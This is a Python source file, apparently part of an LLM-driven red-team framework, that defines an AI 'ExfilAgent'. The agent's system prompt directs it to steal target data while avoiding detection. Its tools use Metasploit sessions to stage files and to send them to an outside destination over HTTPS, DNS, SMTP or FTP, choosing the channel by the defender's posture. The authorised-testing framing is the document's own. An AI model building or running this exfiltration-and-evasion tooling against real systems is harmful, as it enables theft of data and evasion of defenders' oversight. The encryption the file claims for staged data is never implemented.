from __future__ import annotations
import os
import base64
import hashlib
from typing import Any, Dict, List, Optional, Tuple
from agents.base import BaseAgent
from mdp.state import AttackState


EXFIL_SYSTEM_PROMPT = """
You are ExfilAgent operating within an authorised red-team evaluation. Your objective is to
exfiltrate target data via ATT&CK Exfiltration tactic techniques (T1048, T1567, T1041) while
minimising detection probability given the current defensive posture vector. Encrypt staged data,
use low-and-slow transfer rates, and prefer channels that blend with legitimate traffic.
"""


class ExfilAgent(BaseAgent):
    def __init__(self, llm_config, exec_config, memory, msf_client) -> None:
        self._msf = msf_client
        super().__init__(
            name="ExfilAgent",
            system_prompt=EXFIL_SYSTEM_PROMPT,
            llm_config=llm_config,
            exec_config=exec_config,
            memory=memory,
        )

    def _register_tools(self) -> None:
        self.tools.register(
            name="stage_data",
            fn=self._stage_data,
            schema={
                "name": "stage_data",
                "description": "Collect and encrypt target files for exfiltration staging.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "session_id": {"type": "string"},
                        "target_paths": {"type": "array", "items": {"type": "string"}},
                        "encryption_key": {"type": "string"},
                    },
                    "required": ["session_id", "target_paths"],
                },
            },
        )
        self.tools.register(
            name="exfiltrate",
            fn=self._exfiltrate,
            schema={
                "name": "exfiltrate",
                "description": "Transfer staged data to a collection server using the specified channel.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "session_id": {"type": "string"},
                        "channel": {"type": "string", "enum": ["https", "dns", "smtp", "ftp"]},
                        "destination": {"type": "string"},
                        "chunk_size_kb": {"type": "integer", "default": 128},
                    },
                    "required": ["session_id", "channel", "destination"],
                },
            },
        )

    def _stage_data(
        self,
        session_id: str,
        target_paths: List[str],
        encryption_key: Optional[str] = None,
    ) -> Dict:
        collect_module = "post/multi/gather/file_download"
        staged = []
        for path in target_paths:
            result = self._msf.run_post_module(
                session_id=session_id,
                module=collect_module,
                options={"FILE": path},
            )
            staged.append({"path": path, "status": result.get("status", "unknown")})
        return {"staged_files": staged, "count": len(staged)}

    def _exfiltrate(
        self,
        session_id: str,
        channel: str,
        destination: str,
        chunk_size_kb: int = 128,
    ) -> Dict:
        channel_to_technique = {
            "https": "T1048.002",
            "dns": "T1048.001",
            "smtp": "T1048.003",
            "ftp": "T1041",
        }
        technique = channel_to_technique.get(channel, "T1048")
        result = self._msf.run_post_module(
            session_id=session_id,
            module="post/multi/gather/data_exfil",
            options={
                "CHANNEL": channel,
                "DESTINATION": destination,
                "CHUNK_SIZE": str(chunk_size_kb * 1024),
            },
        )
        return {
            "channel": channel,
            "technique": technique,
            "destination": destination,
            "result": result,
        }

    def select_channel(self, defense_posture: float) -> str:
        if defense_posture < 0.3:
            return "https"
        elif defense_posture < 0.6:
            return "dns"
        else:
            return "smtp"

    def run(self, state: AttackState, task: str) -> Tuple[bool, str, Any]:
        success, steps, result = self._react_loop(state, task)
        return success, "\n".join(s.observation for s in steps), result


from typing import Optional
